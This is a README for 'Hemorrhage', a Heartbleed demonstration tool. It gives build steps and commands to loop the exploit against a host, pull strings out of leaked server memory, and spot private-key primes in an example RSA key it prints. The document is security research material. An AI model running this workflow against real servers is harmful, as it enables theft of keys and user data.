Hemorrhage
=====

(c) 2014 Mike Shema, [@CodexWebSecurum](https://twitter.com/CodexWebSecurum)

[http://deadliestwebattacks.com]()

Demonstrate the OpenSSL ["Heartbleed"](https://www.heartbleed.com/) vulnerability.

Refer to LICENSE file for license information.

Motivation
---
Use heartbleed as an excuse to experiment with C++11 and the Boost.ASIO library.

Compilation
---
Prerequisites:
 * Boost installation ([http://www.boost.org]()).
 * OpenSSL 1.0.1f ([http://www.openssl.org]()).

Edit the Makefile's BOOSTDIR and OPENSSLDIR path to match your environment.
````
$ make
````
If you wish to try to Boost.ASIO version, then use the asio target.
````
$ make asio
````

Only tested on Mac OS X. Should compile on Linux without issue. Windows will need some OpenSSL wrangling.
When using boost::asio::ssl, OpenSSL cannot be compiled with '-DOPENSSL_NO_DEPRECATED'. Otherwise, you'll receive an undefined symbols error for '_CRYPTO_set_id_callback' and '_ERR_remove_state' at link time.

Collect Data
---
Note that you may have to adjust your LD_LIBRARY_PATH for hemorrhage to find the OpenSSL and Boost.System libraries at run-time.
On Mac OS X you'll need to set the DYLD_LIBRARY_PATH.
````
$ ./hemorrhage web.site | tee err
$ DYLD_LIBRARY_PATH=/opt/boost/libc++/lib/ ./hemorrhage web.site | tee err
````

Alternate port

````
$ ./hemorrhage web.site 8443 | tee err
````

Loop

````
$ while [ 1 ]; do ./hemorrhage web.site | tee -a err; done
````

Review Output
---
Hemorrhage saves incoming heartbeat traffic to a hemoglo.bin file. This file will always be appended to. Delete it if you wish to start afresh.
````
$ strings hemoglo.bin | sort -u | tee words.txt
$ xxd hemoglo.bin
````


Generate traffic
---
````
$ while [ 1 ]; do curl --insecure https://10.0.1.15 ; done
````

Example Certificate
---
If you're searching for private key information, you'll be looking for items like prime1 and prime2.

````
$ openssl rsa -text -modulus -in example.key
Private-Key: (512 bit)
modulus:
    00:a3:95:f7:4e:c8:b3:45:c4:4e:85:0b:a6:7d:25:
    ad:f9:d4:c0:f5:52:96:4f:5f:07:86:5a:f4:98:ce:
    6b:7d:5f:e4:1c:22:8c:7b:af:45:bf:78:8d:92:1a:
    20:70:23:3b:03:f6:16:5d:56:49:b7:ce:aa:db:19:
    ca:6b:b5:53:e7
publicExponent: 65537 (0x10001)
privateExponent:
    00:96:ab:27:af:4e:b7:9f:c8:a1:31:75:7b:90:c4:
    c5:aa:d7:c4:29:b0:39:75:3d:67:a6:dd:db:6f:6a:
    a0:22:46:58:57:f4:24:0a:ff:40:72:0c:aa:31:78:
    b5:6e:cb:8c:ab:cb:1c:77:42:74:d8:d4:88:ae:06:
    58:b4:62:2c:31
prime1:
    00:d7:29:1f:1b:09:47:15:0d:21:17:44:9d:09:6a:
    fa:4b:c5:13:c0:39:5e:fb:7d:e7:9c:35:f8:c9:b5:
    1a:30:7d
prime2:
    00:c2:a2:c5:2a:cb:4f:bd:0f:f6:86:e9:01:52:ab:
    35:ff:d4:bf:70:96:16:ed:35:d5:71:1c:ae:3a:45:
    27:47:33
exponent1:
    00:cc:a2:9c:a5:ff:25:ee:fc:a4:bb:57:93:af:d0:
    62:2b:cc:4d:a3:a6:2d:13:2e:45:29:4a:1f:cb:e0:
    05:ff:95
exponent2:
    77:2b:2d:c9:3b:de:40:85:cb:8d:62:90:5a:cb:55:
    2e:a4:55:ea:5b:1b:02:75:d9:8f:7d:dd:f6:f3:6c:
    4f:1d
coefficient:
    50:c7:4a:c3:68:53:5d:f2:2e:39:62:8c:37:43:ba:
    79:a0:64:e2:20:8c:02:22:bf:bb:dc:f5:20:d3:b8:
    7b:d5
Modulus=A395F74EC8B345C44E850BA67D25ADF9D4C0F552964F5F07865AF498CE6B7D5FE41C228C7BAF45BF788D921A2070233B03F6165D5649B7CEAADB19CA6BB553E7
writing RSA key
-----BEGIN RSA PRIVATE KEY-----
MIIBOwIBAAJBAKOV907Is0XEToULpn0lrfnUwPVSlk9fB4Za9JjOa31f5BwijHuv
Rb94jZIaIHAjOwP2Fl1WSbfOqtsZymu1U+cCAwEAAQJBAJarJ69Ot5/IoTF1e5DE
xarXxCmwOXU9Z6bd229qoCJGWFf0JAr/QHIMqjF4tW7LjKvLHHdCdNjUiK4GWLRi
LDECIQDXKR8bCUcVDSEXRJ0JavpLxRPAOV77feecNfjJtRowfQIhAMKixSrLT70P
9obpAVKrNf/Uv3CWFu011XEcrjpFJ0czAiEAzKKcpf8l7vyku1eTr9BiK8xNo6Yt
Ey5FKUofy+AF/5UCIHcrLck73kCFy41ikFrLVS6kVepbGwJ12Y993fbzbE8dAiBQ
x0rDaFNd8i45Yow3Q7p5oGTiIIwCIr+73PUg07h71Q==
-----END RSA PRIVATE KEY-----
````

Other Resources
---
[cloudflare_challenge notes by epixoip](https://gist.github.com/epixoip/10570627).
[heartleech](https://github.com/robertdavidgraham/heartleech) tool.
[Metasploit](http://www.metasploit.com) examples for [server](http://www.rapid7.com/db/modules/auxiliary/scanner/ssl/openssl_heartbleed) and [client](http://www.rapid7.com/db/modules/auxiliary/server/openssl_heartbeat_client_memory). These include additional background references.
[Nmap's](http://nmap.org/download.html) [ssl-heartbleed.nse](https://svn.nmap.org/nmap/scripts/ssl-heartbleed.nse) script.
[SSL Pulse](https://www.trustworthyinternet.org/ssl-pulse/) regarding public SSL/TLS web sites.

